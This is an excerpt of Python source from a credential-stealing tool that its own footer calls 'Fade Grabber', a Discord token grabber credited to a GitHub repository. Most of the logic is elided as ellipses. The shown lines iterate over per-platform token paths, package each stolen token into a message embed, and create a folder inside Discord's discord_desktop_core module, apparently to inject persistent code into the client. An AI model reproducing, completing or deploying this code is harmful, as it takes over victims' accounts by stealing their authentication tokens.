    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": "Fade Grabber By Fishy#0608・https://github.com/Rdimo/Fade-Token-Grabber"
                }
            }
            embeds.append(embed)
        ...
        for name in dirs:
            if (name.__contains__("discord_desktop_core-")):
                try:
                    ...
                    os.mkdir(os.path.join(root, name+"\\\\discord_desktop_core\\\\Fade"))
